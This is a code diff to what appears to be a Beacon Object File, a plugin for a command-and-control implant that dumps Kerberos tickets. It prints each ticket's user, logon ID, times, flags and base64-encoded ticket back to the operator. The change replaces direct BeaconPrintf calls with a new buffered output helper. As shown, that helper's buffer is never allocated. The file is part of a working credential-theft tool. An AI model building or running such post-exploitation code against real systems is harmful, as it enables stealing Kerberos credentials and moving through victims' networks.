@@ -2,6 +2,49 @@
 #include "beacon.h"
 #include "common.h"
 
+#define OUTBUFSIZE 65536
+static char* g_out    = (char*)1;
+static int   g_outLen = 1;
+
+static void bflush(void) {
+    if (g_out != NULL && g_out != (char*)1 && g_outLen > 0)
+        BeaconOutput(CALLBACK_OUTPUT, g_out, g_outLen);
+    g_outLen = 0;
+    if (g_out != NULL && g_out != (char*)1)
+        g_out[0] = '\0';
+}
+
+static void bprintf(const char* fmt, ...) {
+    va_list ap;
+    int n, space;
+
+    if (g_out == NULL || g_out == (char*)1) return;
+
+    space = OUTBUFSIZE - g_outLen;
+    if (space <= 1) { bflush(); space = OUTBUFSIZE; }
+
+    va_start(ap, fmt);
+    n = MSVCRT$vsnprintf(g_out + g_outLen, (size_t)space, fmt, ap);
+    va_end(ap);
+
+    /* vsnprintf returns -1 (old msvcrt) or >= space (C99) on truncation. */
+    if (n < 0 || n >= space) {
+        bflush();
+        va_start(ap, fmt);
+        n = MSVCRT$vsnprintf(g_out, OUTBUFSIZE, fmt, ap);
+        va_end(ap);
+        if (n < 0 || n >= OUTBUFSIZE) {
+            g_outLen = OUTBUFSIZE - 1;
+            g_out[g_outLen] = '\0';
+            return;
+        }
+        g_outLen = n;
+        return;
+    }
+
+    g_outLen += n;
+}
+
 BOOL IsSystem() {
     BOOL isSystem = FALSE;
 
@@ -320,7 +363,7 @@ VOID PrintTime(LARGE_INTEGER* li) {
     TIME_FIELDS tf = { 0 };
     NTDLL$RtlSystemTimeToLocalTime(li, &localTime);
     NTDLL$RtlTimeToTimeFields(&localTime, &tf);
-    BeaconPrintf(CALLBACK_OUTPUT, "%02d-%02d-%02d %02d:%02d:%02d", tf.Day, tf.Month, tf.Year, tf.Hour, tf.Minute, tf.Second);
+    bprintf("%02d-%02d-%02d %02d:%02d:%02d", tf.Day, tf.Month, tf.Year, tf.Hour, tf.Minute, tf.Second);
 }
 
 static const FLAG_ENTRY kerbFlags[] = {
@@ -361,30 +404,30 @@ static const char* GetEncType(LONG encType) {
 VOID PrintTicketInformation(PTICKET_ENTRY entry, const char* label) {
     SYSTEMTIME now;
     KERNEL32$GetLocalTime(&now);
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] %02d-%02d-%02d %02d:%02d:%02d - %s:\n", now.wDay, now.wMonth, now.wYear, now.wHour, now.wMinute, now.wSecond, label);
+    bprintf("\n[+] %02d-%02d-%02d %02d:%02d:%02d - %s:\n", now.wDay, now.wMonth, now.wYear, now.wHour, now.wMinute, now.wSecond, label);
 
     char user[512] = { 0 };
     MSVCRT$_snprintf(user, sizeof(user) - 1, "%s @ %s", entry->clientName, entry->clientRealm);
-    BeaconPrintf(CALLBACK_OUTPUT, "  User           :  %s\n", user);
-    BeaconPrintf(CALLBACK_OUTPUT, "  LogonId        :  0x%lx\n", entry->luid.LowPart);
+    bprintf("  User           :  %s\n", user);
+    bprintf("  LogonId        :  0x%lx\n", entry->luid.LowPart);
     if (MSVCRT$strcmp(entry->clientRealm, entry->serverRealm) != 0)
-        BeaconPrintf(CALLBACK_OUTPUT, "  ServerRealm    :  %s\n", entry->serverRealm);
-    BeaconPrintf(CALLBACK_OUTPUT, "  StartTime      :  "); PrintTime(&entry->startTime); BeaconPrintf(CALLBACK_OUTPUT, "\n");
-    BeaconPrintf(CALLBACK_OUTPUT, "  EndTime        :  "); PrintTime(&entry->endTime);   BeaconPrintf(CALLBACK_OUTPUT, "\n");
-    BeaconPrintf(CALLBACK_OUTPUT, "  RenewUntil     :  "); PrintTime(&entry->renewUntil); BeaconPrintf(CALLBACK_OUTPUT, "\n");
-    BeaconPrintf(CALLBACK_OUTPUT, "  EncType        :  %s\n", GetEncType(entry->encryptionType));
+        bprintf("  ServerRealm    :  %s\n", entry->serverRealm);
+    bprintf("  StartTime      :  "); PrintTime(&entry->startTime); bprintf("\n");
+    bprintf("  EndTime        :  "); PrintTime(&entry->endTime);   bprintf("\n");
+    bprintf("  RenewUntil     :  "); PrintTime(&entry->renewUntil); bprintf("\n");
+    bprintf("  EncType        :  %s\n", GetEncType(entry->encryptionType));
 
     UINT flags = entry->ticketFlags;
     BOOL first = TRUE;
-    BeaconPrintf(CALLBACK_OUTPUT, "  Flags          :  ");
+    bprintf("  Flags          :  ");
     for (int k = 0; k < (int)(sizeof(kerbFlags) / sizeof(kerbFlags[0])); k++) {
         if (flags & kerbFlags[k].mask) {
-            BeaconPrintf(CALLBACK_OUTPUT, first ? "%s" : ", %s", kerbFlags[k].name);
+            bprintf(first ? "%s" : ", %s", kerbFlags[k].name);
             first = FALSE;
         }
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "\n");
-    BeaconPrintf(CALLBACK_OUTPUT, "  EncodedTicket  :  ");
+    bprintf("\n");
+    bprintf("  EncodedTicket  :  ");
 }
 
 VOID PrintTicket(PBYTE ticket, ULONG ticketSize) {
@@ -406,6 +449,6 @@ VOID PrintTicket(PBYTE ticket, ULONG ticketSize) {
     }
     b64[j] = '\0';
 
-    BeaconPrintf(CALLBACK_OUTPUT, "%s\n\n", b64);
+    bprintf("%s\n\n", b64);
     MemFree(b64);
 }
